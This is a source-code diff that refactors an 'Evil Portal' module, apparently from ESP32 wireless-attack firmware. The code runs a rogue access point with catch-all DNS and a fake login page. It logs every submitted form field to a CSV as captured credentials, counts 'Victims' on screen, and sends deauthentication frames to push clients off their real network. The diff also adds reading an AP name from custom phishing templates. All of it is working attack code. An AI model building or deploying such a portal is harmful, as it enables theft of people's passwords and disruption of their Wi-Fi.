@@ -67,76 +67,82 @@ void EvilPortal::beginAP() {
     wifiConnected = true;
 
     int tmp = millis();
-    while(millis() - tmp < 3000) yield();
+    while (millis() - tmp < 3000) yield();
 
     setupRoutes();
-
     dnsServer.start(53, "*", WiFi.softAPIP());
     webServer.begin();
 }
 
 
 void EvilPortal::setupRoutes() {
-    webServer.on("/", [this](){ portalController(); });
-
-    webServer.on("/post", [this](){ credsController(); });
-
+    webServer.on("/", [this]() { portalController(); });
+    webServer.on("/post", [this]() { credsController(); });
     webServer.on("/creds", [this]() { webServer.send(200, "text/html", creds_GET()); });
+    webServer.on("/ssid", [this]() { webServer.send(200, "text/html", ssid_GET()); });
 
-    webServer.on("/ssid",  [this]() { webServer.send(200, "text/html", ssid_GET()); });
-
-    webServer.on("/postssid", [this](){
-        if(webServer.hasArg("ssid")) apName = webServer.arg("ssid").c_str();
+    webServer.on("/postssid", [this]() {
+        if (webServer.hasArg("ssid")) apName = webServer.arg("ssid").c_str();
         webServer.send(200, "text/html", ssid_POST());
-
-        webServer.stop();                     // para o servidor
-        wifiDisconnect();                     // desliga o WiFi
-        WiFi.softAP(apName);                  // reinicia WiFi com novo SSID
-        webServer.begin();                    // reinicia o servidor
-        previousTotalCapturedCredentials=-1;  // redesenha a tela
+        restartWiFi();
     });
 
-    webServer.onNotFound([this](){
+    webServer.onNotFound([this]() {
         if (webServer.args() > 0) credsController();
         else portalController();
     });
 }
 
+void EvilPortal::restartWiFi() {
+    webServer.stop();             // Stop Web server
+    wifiDisconnect();             // Disconnect WiFi
+    WiFi.softAP(apName);          // Start Wi-Fi in AP mode with the SSID
+    resetCapturedCredentials();   // Reset captured credentials count
+}
 
-void EvilPortal::loop() {
-    int tmp = millis(); // one deauth frame each 30ms at least
-    bool holdDeauth = false;
-    bool redraw = true;
+void EvilPortal::resetCapturedCredentials(void) {
+    previousTotalCapturedCredentials = -1;  // Reset captured credentials count
+}
 
-    while(1) {
-        if(redraw) {
-            drawScreen(holdDeauth);
-            redraw=false;
+ void EvilPortal::loop() {
+    int lastDeauthTime = millis(); // one deauth frame each 30ms at least
+    bool isDeauthHeld = false;
+    bool shouldRedraw = true;
+
+    while (true) {
+        if (shouldRedraw) {
+            drawScreen(isDeauthHeld);
+            shouldRedraw = false;
         }
 
         dnsServer.processNextRequest();
         webServer.handleClient();
 
-        if(!holdDeauth && (millis()-tmp) >250  && _deauth)  {
-            send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
-            tmp=millis();
+        if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
+            send_raw_frame(deauth_frame, 26);  // Sends deauth frames if needed
+            lastDeauthTime = millis();
         }
 
-        if(totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
-            redraw = true;
-            previousTotalCapturedCredentials = totalCapturedCredentials-1;
+        if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
+            shouldRedraw = true;
+            previousTotalCapturedCredentials = totalCapturedCredentials - 1;
         }
 
-        if(checkSelPress()) {
-            while(checkSelPress()) { delay(80); } // timerless debounce
-            holdDeauth = !holdDeauth;
-            redraw = true;
+        if (checkSelPress()) {
+            debounceButtonPress();
+            isDeauthHeld = !isDeauthHeld;
+            shouldRedraw = true;
         }
 
-        if(checkEscPress()) break;
+        if (checkEscPress()) break;
     }
 }
 
+void EvilPortal::debounceButtonPress() {
+    while (checkSelPress()) {
+        delay(80);  // Timerless debounce
+    }
+}
 
 void EvilPortal::drawScreen(bool holdDeauth) {
     drawMainBorderWithTitle("EVIL PORTAL");
@@ -145,9 +151,10 @@ void EvilPortal::drawScreen(bool holdDeauth) {
     if (apName.length() > 30) subtitle += "...";
     printSubtitle(subtitle);
 
+    String apIp = WiFi.softAPIP().toString();
     padprintln("");
-    padprintln("-> " + WiFi.softAPIP().toString() + "/creds");
-    padprintln("-> " + WiFi.softAPIP().toString() + "/ssid");
+    padprintln("-> " + apIp + "/creds");
+    padprintln("-> " + apIp + "/ssid");
 
     padprintln("");
     padprint("Victims: ");
@@ -156,30 +163,54 @@ void EvilPortal::drawScreen(bool holdDeauth) {
     tft.setTextColor(bruceConfig.priColor);
 
     padprintln("");
-    padprintln(lastCred.substring(0, lastCred.indexOf('\n')));
-    padprintln(lastCred.substring(lastCred.indexOf('\n')+1));
+    printLastCapturedCredential();
 
-    if (_deauth){
-        if (holdDeauth) {
-            printFootnote("Deauth OFF");
-        } else {
-            tft.setTextColor(TFT_RED);
-            printFootnote("Deauth ON");
-            tft.setTextColor(bruceConfig.priColor);
-        }
+    if (_deauth) {
+        printDeauthStatus(holdDeauth);
     }
 }
 
+void EvilPortal::printLastCapturedCredential() {
+    int newlineIndex = lastCred.indexOf('\n');
+    padprintln(lastCred.substring(0, newlineIndex));
+    padprintln(lastCred.substring(newlineIndex + 1));
+}
+
+void EvilPortal::printDeauthStatus(bool holdDeauth) {
+    if (holdDeauth) {
+        printFootnote("Deauth OFF");
+    } else {
+        tft.setTextColor(TFT_RED);
+        printFootnote("Deauth ON");
+        tft.setTextColor(bruceConfig.priColor);
+    }
+}
 
 void EvilPortal::loadCustomHtml() {
     getFsStorage(fsHtmlFile);
 
     htmlFileName = loopSD(*fsHtmlFile, true, "HTML");
-    String htmlName = htmlFileName.substring(htmlFileName.lastIndexOf("/"), htmlFileName.length()-5);
-    htmlName.toLowerCase();
+    String fileBaseName = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
+    fileBaseName.toLowerCase();
 
-    outputFile = htmlName + "_creds.csv";
+    outputFile = fileBaseName + "_creds.csv";
     isDefaultHtml = false;
+
+    // Open the file and read the first line (searching for: <!-- AP="..." -->)
+    File htmlFile = fsHtmlFile->open(htmlFileName, FILE_READ);
+    if (htmlFile) {
+        String firstLine = htmlFile.readStringUntil('\n');  // Read the first line
+        htmlFile.close();
+
+        // Look for the AP tag in the first line
+        int apStart = firstLine.indexOf("<!-- AP=\"");
+        if (apStart != -1) {
+            int apEnd = firstLine.indexOf("\" -->", apStart);
+            if (apEnd != -1) {
+                apName = firstLine.substring(apStart + 9, apEnd);  // Extract the AP name
+            }
+        }
+    }
 }
 
 
@@ -206,39 +237,40 @@ void EvilPortal::portalController() {
     }
 }
 
-
 void EvilPortal::credsController() {
-    String htmlTemp = "<li>";
+    String htmlResponse = "<li>";
     String csvLine = "";
-    String argName;
+    String key;
+
     lastCred = "";
 
     for (int i = 0; i < webServer.args(); i++) {
-        String argName = webServer.argName(i);
-        if (
-            argName == "q" ||
-            argName.startsWith("cup2") ||
-            argName.startsWith("plain") ||
-            argName == "P1" ||
-            argName == "P2" ||
-            argName == "P3" ||
-            argName == "P4"
-        ) continue;
+        key = webServer.argName(i);
 
-        htmlTemp += webServer.argName(i) + ": " + webServer.arg(i) + "<br>\n";
-        if (i != 0) csvLine += ",";
-        csvLine += webServer.argName(i) + ": " + webServer.arg(i);
-        lastCred += webServer.argName(i).substring(0,3) + ": " + webServer.arg(i) + "\n";
+        // Skip irrelevant parameters
+        if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") || key == "P1" || key == "P2" || key == "P3" || key == "P4") {
+            continue;
+        }
+
+        // Build HTML and CSV line
+        htmlResponse += key + ": " + webServer.arg(i) + "<br>\n";
+        if (i > 0) {
+            csvLine += ",";
+        }
+        csvLine += key + ": " + webServer.arg(i);
+        lastCred += key.substring(0, 3) + ": " + webServer.arg(i) + "\n";
     }
 
-    htmlTemp += "</li>\n";
+    htmlResponse += "</li>\n";
+
+    // Save to CSV and update captured credentials
     saveToCSV(csvLine);
-    capturedCredentialsHtml = htmlTemp + capturedCredentialsHtml;
+    capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
     totalCapturedCredentials++;
 
+    // Send response to the client
     webServer.send(200, "text/html", wifiLoadPage());
 }
-
 
 String EvilPortal::getHtmlTemplate(String body) {
     PROGMEM String html =
